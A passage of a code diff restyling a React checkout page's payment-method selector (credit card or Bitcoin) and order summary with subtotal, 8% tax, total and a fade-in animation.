+              <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm">
+                <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
+                  <Lock className="w-6 h-6 mr-3 text-blue-600" />
+                  Payment Method
+                </h2>
+                
+                <div className="space-y-4 mb-8">
+                  <PaymentMethodCard
+                    icon={<CreditCard className="h-6 w-6" />}
+                    title="Credit Card"
+                    description="Pay securely with Visa, Mastercard, or American Express"
+                    isSelected={paymentMethod === 'credit-card'}
+                    onClick={() => setPaymentMethod('credit-card')}
+                    badge="Popular"
+                  />
+                  
+                  <PaymentMethodCard
+                    icon={<Bitcoin className="h-6 w-6" />}
+                    title="Bitcoin"
+                    description="Pay with cryptocurrency - fast and secure"
+                    isSelected={paymentMethod === 'bitcoin'}
+                    onClick={() => setPaymentMethod('bitcoin')}
+                    
+                  />
+                </div>
+
+                <div className="transition-all duration-500">
+                  {paymentMethod === 'credit-card' ? (
+                    <CreditCardPayment totalAmount={getTotalPrice() * 1.08} />
+                  ) : (
+                    <BitcoinPayment totalAmount={getTotalPrice() * 1.08} />
+                  )}
+                </div>
+              </Card>
+            </div>
+
+            <div className={`transition-all duration-700 delay-300 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
+              <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm sticky top-6">
+                <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
+                  <Star className="w-6 h-6 mr-3 text-yellow-500" />
+                  Order Summary
+                </h2>
+
+                <div className="space-y-6 mb-8">
+                  {cart.map((item, index) => (
+                    <div key={item.id} className={`flex items-start space-x-4 p-4 rounded-2xl bg-gray-50 transition-all duration-300 hover:bg-gray-100 animate-fade-in`} style={{animationDelay: `${index * 100}ms`}}>
                       <img
                         src={item.image}
                         alt={item.name}
-                        className="w-16 h-16 object-cover rounded-md"
+                        className="w-16 h-16 object-cover rounded-xl shadow-md"
                       />
-                      <div>
-                        <p className="text-sm font-medium text-gray-900">{item.name}</p>
-                        <p className="text-xs text-gray-500 mt-1">Qty: {item.quantity}</p>
-                        <p className="text-sm font-medium text-gray-900 mt-1">${item.price.toFixed(2)}</p>
+                      <div className="flex-1">
+                        <p className="font-semibold text-gray-900 text-sm">{item.name}</p>
+                        <p className="text-xs text-gray-500 mt-1">Quantity: {item.quantity}</p>
+                        <p className="text-sm font-bold text-blue-600 mt-2">${item.price.toFixed(2)}</p>
                       </div>
+                      <p className="text-lg font-bold text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
                     </div>
-                    <p className="text-sm font-medium text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
+                  ))}
+                </div>
+
+                <div className="space-y-4 border-t border-gray-200 pt-6">
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-600">Subtotal</span>
+                    <span className="font-semibold text-gray-900">${getTotalPrice().toFixed(2)}</span>
                   </div>
-                ))}
-              </div>
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-600 flex items-center">
+                      <Truck className="w-4 h-4 mr-1" />
+                      Shipping
+                    </span>
+                    <span className="font-semibold text-green-600">Free</span>
+                  </div>
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-600">Tax (8%)</span>
+                    <span className="font-semibold text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
+                  </div>
+                  <div className="flex justify-between items-center font-bold text-xl pt-4 border-t border-gray-200">
+                    <span className="text-gray-900">Total</span>
+                    <span className="text-blue-600">${(getTotalPrice() * 1.08).toFixed(2)}</span>
+                  </div>
+                </div>
 
-              <div className="space-y-3 border-t border-gray-200 pt-4">
-                <div className="flex justify-between">
-                  <span className="text-sm text-gray-600">Subtotal</span>
-                  <span className="text-sm font-medium text-gray-900">${getTotalPrice().toFixed(2)}</span>
+                <div className="mt-8 p-4 bg-gradient-to-r from-green-50 to-blue-50 rounded-2xl border border-green-200">
+                  <div className="flex items-center space-x-3">
+                    <Shield className="h-5 w-5 text-green-600" />
+                    <div>
+                      <p className="text-sm font-semibold text-green-900">Secure Payment</p>
+                      <p className="text-xs text-green-700">SSL encrypted & PCI compliant</p>
+                    </div>
+                  </div>
                 </div>
-                <div className="flex justify-between">
-                  <span className="text-sm text-gray-600">Shipping</span>
-                  <span className="text-sm font-medium text-gray-900">Free</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-sm text-gray-600">Tax</span>
-                  <span className="text-sm font-medium text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
-                </div>
-                <div className="flex justify-between font-bold text-lg pt-3 border-t border-gray-200 mt-2">
-                  <span className="text-gray-900">Total</span>
-                  <span className="text-gray-900">${(getTotalPrice() * 1.08).toFixed(2)}</span>
-                </div>
-              </div>
 
-              <div className="mt-6 text-xs text-gray-500">
-                <p>By placing your order, you agree to our <a href="#" className="text-blue-600 hover:underline">Terms of Service</a></p>
-              </div>
-            </Card>
+                <div className="mt-6 text-xs text-gray-500 text-center">
+                  <p>By placing your order, you agree to our <a href="#" className="text-blue-600 hover:underline font-medium">Terms of Service</a> and <a href="#" className="text-blue-600 hover:underline font-medium">Privacy Policy</a></p>
+                </div>
+              </Card>
+            </div>
           </div>
         </div>
       </div>
+
+      <style jsx>{`
+        @keyframes fade-in {
+          from {
+            opacity: 0;
+            transform: translateY(20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
+          }
+        }
+        
+        .animate-fade-in {
+          animation: fade-in 0.6s ease-out forwards;
+          opacity: 0;
+        }
+      `}</style>
     </div>
   );
 };
